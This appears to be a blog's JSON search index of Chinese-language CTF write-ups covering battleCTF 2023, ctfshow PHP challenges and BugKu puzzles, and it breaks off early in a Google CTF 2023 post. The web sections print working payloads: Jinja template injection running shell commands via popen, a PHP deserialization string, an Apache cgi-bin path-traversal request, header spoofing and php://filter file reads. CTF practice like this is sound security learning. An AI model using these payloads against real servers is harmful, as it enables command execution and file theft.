[{"title":"Africa battle CTF","url":"/2023/06/26/Africa-battle-CTF/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"Civilization\"><a href=\"#Civilization\" class=\"headerlink\" title=\"Civilization\"></a>Civilization</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">&quot;./flag.php&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ami&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ami&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$cigar</span> = <span class=\"string\">&#x27;africacradlecivilization&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&quot;/<span class=\"subst\">$cigar</span>/&quot;</span>,<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$input</span>) === <span class=\"variable\">$cigar</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">africa</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;home.html&quot;</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>?source得到这个，这个只用双写就可以绕过。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ami=africacradlecafricacradlecivilizationivilization</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Cobalt-Injection\"><a href=\"#Cobalt-Injection\" class=\"headerlink\" title=\"Cobalt Injection\"></a>Cobalt Injection</h2><p>在源代码里有</p>\n<p><code>&lt;!-- IP?capital=Benin --&gt;</code></p>\n<p><img src=\"/pic/Africa/8085.png\"></p>\n<p>可知存在ssti模板注入。没有过滤。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>当然看别人的WP，要长脑子了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>#request.application：表示当前请求的应用程序对象。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?capital=&#123;&#123;().__class__.__base__.__subclasses__()[354](&#x27;cat flag.txt&#x27;, shell=True, stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个还没搞明白，搞明白了再回来修改。</p>\n<h2 id=\"Fa\"><a href=\"#Fa\" class=\"headerlink\" title=\"Fâ\"></a>Fâ</h2><p>访问?source</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;source&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">africa</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"variable\">$boknn</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> <span class=\"variable\">$du</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fa&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$vodoo</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;fa&#x27;</span>];</span><br><span class=\"line\">       </span><br><span class=\"line\">        <span class=\"variable\">$fa</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$vodoo</span>);</span><br><span class=\"line\">       </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$fa</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$fa</span>-&gt;du=<span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fa</span>-&gt;du === <span class=\"variable\">$fa</span>-&gt;boknn)</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Congratulation! You&#x27;ve got the best interpretation: &lt;b&gt;&quot;</span>.<span class=\"variable\">$fa</span>-&gt;du.<span class=\"string\">&quot;&lt;/b&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Oh no...&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">echo</span> <span class=\"string\">&quot;you dey smoke igbo?&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"string\">&quot;home.html&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<p>反序列化，只要将传入的fa值和$du相等就可以输出flag。</p>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?fa=O:6:&quot;africa&quot;:2:&#123;s:5:&quot;boknn&quot;;N;s:2:&quot;du&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>其中，boknn的值为NULL，du的值通过R引用了编号为2的值，</p>\n<p><img src=\"/pic/Africa/8084.png\"></p>\n<p>boknn的编号就为2。</p>\n<p>具体的可以看:<a href=\"https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html\">https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html</a></p>\n<h2 id=\"Own-reality\"><a href=\"#Own-reality\" class=\"headerlink\" title=\"Own reality\"></a>Own reality</h2><p>真是让我长见识了。</p>\n<p>首先是.git泄露</p>\n<p>用wget将网站下载下来</p>\n<p> `wget <a href=\"http://chall.battlectf.online:8082/.git/\">http://chall.battlectf.online:8082/.git/</a> -mirror</p>\n<p>使用 <code>--mirror</code> 选项你可以下载整个站点，包括它的目录结构。</p>\n<p>然后用git reflog查看历史版本，之后用git cherry-pick ‘你想要恢复的’</p>\n<p>会出来一个flag.txt,尾部有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._</span><br></pre></td></tr></table></figure>\n\n<p>二进制转换为字符就是flag</p>\n<h2 id=\"It-shock-you\"><a href=\"#It-shock-you\" class=\"headerlink\" title=\"It shock you\"></a>It shock you</h2><p>先用whatweb看网站，</p>\n<p><img src=\"/pic/Africa%5C8083.1.png\"></p>\n<p>可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越</p>\n<p>POC:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1</span><br><span class=\"line\">Host: chall.battlectf.online:8083</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">If-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMT</span><br><span class=\"line\">If-None-Match: &quot;b6d-5fd772fd55940&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Africa\"><a href=\"#Africa\" class=\"headerlink\" title=\"Africa\"></a>Africa</h2><p><code>Warning: This site is only for africa people.</code></p>\n<p>在bp中将<code>User-Agent</code>改为<code>africa</code></p>\n<p><code>     Warning: Go away! Attacker! This page is only for local client!</code></p>\n<p>用<code>X-Forwarded-For</code>伪造127.0.0.1</p>\n<p><code>Warning: I don&#39;t trust users who are not from battlectf.online</code></p>\n<p>用<code>Referer</code>绕过得到flag。</p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"Back-To-Origin\"><a href=\"#Back-To-Origin\" class=\"headerlink\" title=\"Back To Origin\"></a>Back To Origin</h2><p>埃及象形文</p>\n<p><a href=\"https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf\">https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf</a></p>\n<p>可以参考上面的链接</p>\n<h2 id=\"Blind\"><a href=\"#Blind\" class=\"headerlink\" title=\"Blind\"></a>Blind</h2><p><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a></p>\n<p>首先是<code>magic</code>解码，然后 <code>braille</code>,解码得到flag</p>\n<h2 id=\"ROCYOU\"><a href=\"#ROCYOU\" class=\"headerlink\" title=\"ROCYOU\"></a>ROCYOU</h2><p><code>factordb</code>和<code>yafu</code>分解不出来，看别人的博客知道有<code>ROCA漏洞</code>，可以从公钥中提取私钥</p>\n<p>工具：</p>\n<p><a href=\"https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca\">https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca</a></p>\n<p>一开始运行要给权限</p>\n<p><img src=\"/pic/Africa/rock.png\"></p>\n<p>可以用在线的rsa解密工具：<a href=\"https://www.dcode.fr/chiffre-rsa\">https://www.dcode.fr/chiffre-rsa</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">p=127801155916875524149457561567678575565270601000365665873572024750823913157383</span><br><span class=\"line\">q=113917064871970833547038329106470040388258358281464605006613652518914797349747</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"goose\"><a href=\"#goose\" class=\"headerlink\" title=\"goose\"></a>goose</h2><p>首先给了5个随机数，然后将falg的每个字符通过<code>res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)</code>进行加密。</p>\n<p>flag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164</span><br><span class=\"line\">177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541</span><br><span class=\"line\">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class=\"line\">362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988</span><br><span class=\"line\">272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124</span><br><span class=\"line\">208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193</span><br></pre></td></tr></table></figure>\n\n<p>解得：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">a=6709636436</span><br><span class=\"line\">b=7748795321</span><br><span class=\"line\">c=7386429784</span><br><span class=\"line\">d=62359624</span><br><span class=\"line\">e=5008041292</span><br></pre></td></tr></table></figure>\n\n<p>然后写代码爆破:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">a=<span class=\"number\">6709636436</span></span><br><span class=\"line\">b=<span class=\"number\">7748795321</span></span><br><span class=\"line\">c=<span class=\"number\">7386429784</span></span><br><span class=\"line\">d=<span class=\"number\">62359624</span></span><br><span class=\"line\">e=<span class=\"number\">5008041292</span></span><br><span class=\"line\">tab=[<span class=\"number\">1245115057305148164</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1835524676869638124</span>, <span class=\"number\">1404473868033353193</span>, <span class=\"number\">272777109172255911</span>, <span class=\"number\">672752034376118188</span>, <span class=\"number\">324890781330979572</span>, <span class=\"number\">3086023531811583439</span>, <span class=\"number\">475309634185807521</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1578661367846445708</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">773945458916291731</span>, <span class=\"number\">78288818574073053</span>, <span class=\"number\">2441940832124642988</span>, <span class=\"number\">1578661367846445708</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">343816904985468003</span>, <span class=\"number\">1195140205147730541</span>, <span class=\"number\">2527132076695959961</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">2358921859155462327</span>, <span class=\"number\">1099718459319293547</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">72109063929756364</span>, <span class=\"number\">2796116718132693772</span>, <span class=\"number\">3291439457645322417</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">x</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"number\">2</span>*a*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">4</span>)+b*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">3</span>)+c*<span class=\"built_in\">pow</span>(<span class=\"built_in\">ord</span>(x),<span class=\"number\">2</span>)+d*<span class=\"built_in\">ord</span>(x)+e)</span><br><span class=\"line\"><span class=\"keyword\">for</span> val <span class=\"keyword\">in</span> tab:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">126</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(encrypt(<span class=\"built_in\">chr</span>(i))==val):</span><br><span class=\"line\">            flag+=<span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"seyi\"><a href=\"#seyi\" class=\"headerlink\" title=\"seyi\"></a>seyi</h2><p>ida64位打开,flag在getshell里面。</p>\n<h2 id=\"welcome\"><a href=\"#welcome\" class=\"headerlink\" title=\"welcome\"></a>welcome</h2><p><img src=\"/pic/Africa/welcome.png\"></p>\n<p>重点就是这个，</p>\n<p>add就是加，</p>\n<p>xor就是异或。</p>\n<p>很简单的一个表达式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a = <span class=\"number\">0x522D1B20F6</span></span><br><span class=\"line\">b = <span class=\"number\">0x1EE2EEEE</span></span><br><span class=\"line\">c = a+b</span><br><span class=\"line\">d = <span class=\"number\">0x0AA84AAA</span></span><br><span class=\"line\">flag = c^d</span><br><span class=\"line\">flag = long_to_bytes(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Infinity\"><a href=\"#Infinity\" class=\"headerlink\" title=\"Infinity\"></a>Infinity</h2><p><img src=\"/pic/Africa/in.png\"></p>\n<p>找到汇编代码里所有的push，然后将值转换一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">a=\t[p64(<span class=\"number\">0x5F4F7572</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x6C654354</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x467B4265</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x796F6E64</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x62617474</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x47616C61</span>),</span><br><span class=\"line\">\tp64(<span class=\"number\">0x7869657D</span>)]</span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(c)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">b&#x27;ruO_\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;TCel\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;eB&#123;F\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;dnoy\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;ttab\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;alaG\\x00\\x00\\x00\\x00&#x27;</span><br><span class=\"line\">b&#x27;&#125;eix\\x00\\x00\\x00\\x00&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>然后将这些反转一下删掉多余的东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_Our</span><br><span class=\"line\">leCT</span><br><span class=\"line\">F&#123;Be</span><br><span class=\"line\">batt</span><br><span class=\"line\">Gala</span><br><span class=\"line\">xie&#125;</span><br><span class=\"line\">yond</span><br></pre></td></tr></table></figure>\n\n<p>最后将这些拼接一下，<code>battleCTF&#123;Beyond_OurGalaxie&#125; </code>。</p>\n<h2 id=\"babyrev\"><a href=\"#babyrev\" class=\"headerlink\" title=\"babyrev\"></a>babyrev</h2><p>用ida打开，查询字符串能发现<code>qpiiatRIU&#123;Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46&#125;</code>，然后凯撒解密得到flag</p>\n<h2 id=\"checker\"><a href=\"#checker\" class=\"headerlink\" title=\"checker\"></a>checker</h2><p>和上一题基本上差不多</p>\n<p><code>gfyyqjHYK&#123;Flg4_d0z_i3d_xr0p3_1lg0?&#125;</code>然后凯撒解密</p>\n","categories":["ctf"],"tags":["ctf"]},{"title":"ctfshow web89~96","url":"/2023/02/02/89/","content":"<h1 id=\"web89\"><a href=\"#web89\" class=\"headerlink\" title=\"web89\"></a>web89</h1><p><img src=\"/pic/89.png\"><br>用数组绕过就行。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num[]=a;</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<h1 id=\"web90\"><a href=\"#web90\" class=\"headerlink\" title=\"web90\"></a>web90</h1><p><img src=\"/pic/90.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">intval( mixed $var[, int $base = 10] ) : int</span><br><span class=\"line\"></span><br><span class=\"line\">var</span><br><span class=\"line\">要转换成 integer 的数量值</span><br><span class=\"line\">base</span><br><span class=\"line\">转化所使用的进制 </span><br><span class=\"line\">Note: </span><br><span class=\"line\">如果 base 是 0，通过检测 var 的格式来决定使用的进制： </span><br><span class=\"line\">◦ 如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，  </span><br><span class=\"line\">◦ 如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，  </span><br><span class=\"line\">◦ 将使用 10 进制 (decimal)。 </span><br></pre></td></tr></table></figure>\n<p>只需要提交0x117c就行，0x117c是16进制的4476，也可以提交4476+字符。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=0x117c</span><br><span class=\"line\">?num=4476a</span><br></pre></td></tr></table></figure>\n<h1 id=\"web91\"><a href=\"#web91\" class=\"headerlink\" title=\"web91\"></a>web91</h1><p><img src=\"/pic/91.png\"><br>第一次是/im第二次是/i<br>/im可以匹配多行，/i只能匹配一行。<br>所以让他第一次匹配到php第二次匹配不到php。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?cmd=1%0aphp</span><br></pre></td></tr></table></figure>\n<h1 id=\"web92\"><a href=\"#web92\" class=\"headerlink\" title=\"web92\"></a>web92</h1><p><img src=\"/pic/92.png\"><br>可以换个进制绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=0x117c</span><br></pre></td></tr></table></figure>\n<p>或者还有e这个东西</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476e123</span><br></pre></td></tr></table></figure>\n<h1 id=\"web93\"><a href=\"#web93\" class=\"headerlink\" title=\"web93\"></a>web93</h1><p><img src=\"/pic/93.png\"><br>可以用小数，也可以用8进制<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476.1</span><br><span class=\"line\">?num=010574</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">二进制0bxxx</span><br><span class=\"line\">八进制0xxxxxx</span><br><span class=\"line\">十六进制0xaaaa</span><br></pre></td></tr></table></figure>\n<h1 id=\"web94\"><a href=\"#web94\" class=\"headerlink\" title=\"web94\"></a>web94</h1><p><img src=\"/pic/94.png\"><br>strpos是匹配字符，必须要匹配到0而且还不能在第一位，可以用8进制也可以用小数。<br>如果用8进制的话必须在开头加一个空格。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num=4476.0</span><br><span class=\"line\">/?num= 010574</span><br></pre></td></tr></table></figure>\n<h1 id=\"web95\"><a href=\"#web95\" class=\"headerlink\" title=\"web95\"></a>web95</h1><p><img src=\"/pic/95.png\"><br>这一道题多过滤了一个点，所以没法用小数了，其他的跟上一道题一样。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?num= 010574</span><br></pre></td></tr></table></figure>\n<h1 id=\"web96\"><a href=\"#web96\" class=\"headerlink\" title=\"web96\"></a>web96</h1><p><img src=\"/pic/96.png\"><br>想办法读取flag.php还不能直接传flag.php，利用路径或者php协议就行。<br>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">?u=/var/www/html/flag.php</span><br><span class=\"line\">?u=./flag.php</span><br><span class=\"line\">?u=php://filter/resource=falg.php</span><br></pre></td></tr></table></figure>","categories":["ctfshow","刷题","php特性"],"tags":["ctfshow","刷题","php特性"]},{"title":"BugKu刷题","url":"/2023/01/28/BugKu%E5%88%B7%E9%A2%98/","content":"<h1 id=\"聪明的小羊\"><a href=\"#聪明的小羊\" class=\"headerlink\" title=\"聪明的小羊\"></a>聪明的小羊</h1><p>题目描述：一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}<br>栅栏密码，分两栏时就是flag。</p>\n<span id=\"more\"></span>\n<p>flag:<code>flag&#123;6fde4163df05d900&#125;</code></p>\n<h1 id><a href=\"#\" class=\"headerlink\" title=\"/.-\"></a>/.-</h1><p>题目描述： ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-<br>很明显的摩斯密码，<a href=\"https://www.lddgo.net/encrypt/morse\">在线摩斯密码翻译</a>，可以解出flag：FLAG%u7bD3FCBF17F9399504%u7d<br>%u7b是{，%u7d是}，然后字母全部改为小写就是flag。<br>flag:<code>flag&#123;d3fcbf17f9399504&#125;</code></p>\n<h1 id=\"ok\"><a href=\"#ok\" class=\"headerlink\" title=\"ok\"></a>ok</h1><p>题目是okk编码，用<a href=\"https://www.splitbrain.org/services/ook\"></a>可以直接获得flag。<br>flag：<code>flag&#123;0a394df55312c51a&#125;</code></p>\n<h1 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h1><p>下载文件解压，用记事本的形式打开文件，ctrl+搜索key就能找到flag。<br>flag:<code>key&#123;feb81d3834e2423c9903f4755464060b&#125;</code></p>\n<h1 id=\"闪的好快\"><a href=\"#闪的好快\" class=\"headerlink\" title=\"闪的好快\"></a>闪的好快</h1><p>下载是一个gif图，用stegsolve打开，一帧一帧扫二维码，然后拼接起来就是flag。<br>flag：<code>SYC&#123;F1aSh_so_f4sT&#125;</code></p>\n<h1 id=\"隐写2\"><a href=\"#隐写2\" class=\"headerlink\" title=\"隐写2\"></a>隐写2</h1><p>图片的大小感觉和他本身有点不符，用binwalk一看，确实有隐藏的文件。<br>分离之后是一个压缩包和一个提示，提示说明解压密码是三位数字。<br>暴力破解一下，密码是871，解压之后又是一个图片，用记事本打开，末尾有<code>f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;</code><br>base64解码得到falg。<br>flag：<code>f1@g&#123;y0u Are a h@cker!&#125;</code></p>\n<h1 id=\"白哥的鸽子\"><a href=\"#白哥的鸽子\" class=\"headerlink\" title=\"白哥的鸽子\"></a>白哥的鸽子</h1><p>用stegsolve打开，fileformat最下面有类似于flag的文字。<a href=\"http://moersima.00cha.net/shanlan.asp\">栅栏密码在线加密解密</a>栅栏加密，<br>当栅栏数为3时，就是flag。<br>flag：<code>flag&#123;w22_is_v3ry_cool&#125;</code></p>\n<h1 id=\"再也没有纯白的灵魂\"><a href=\"#再也没有纯白的灵魂\" class=\"headerlink\" title=\"再也没有纯白的灵魂\"></a>再也没有纯白的灵魂</h1><p>文件开头是~呜嗷开头的，查过之后才发现是兽音密文<a href=\"https://roar.iiilab.com/\"></a>。由于不知道怎么加密的，就先将flag加密一下试试，然后一一对应，最坑人的是少了一个G，真的恶心人。。。。<br>最后解出来就是flag。<br>flag：<code>flag&#123;ni-zhen-shi-shou-ren&#125;</code></p>\n","categories":["BugKu","刷题"],"tags":["刷题","BugKu"]},{"title":"Google-CTF2023","url":"/2023/06/29/Google-CTF2023/","content":"<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"PAPAPAPA\"><a href=\"#PAPAPAPA\" class=\"headerlink\" title=\"PAPAPAPA\"></a>PAPAPAPA</h2><p>下载下来附件是一张全白的图片，通过修改jpg的宽高获得flag</p>\n<p><img src=\"/pic/googlectf/papapa.png\"></p>\n<p>从<code>FF</code>到<code>01</code>中间，修改成<code>FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01</code></p>\n<p>右边就是flag</p>\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"UNDER-CONSTRUCTION\"><a href=\"#UNDER-CONSTRUCTION\" class=\"headerlink\" title=\"UNDER-CONSTRUCTION\"></a>UNDER-CONSTRUCTION</h2><p>给了一个flask和一个php的服务，没有办法ssti注入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getResponse</span>(<span 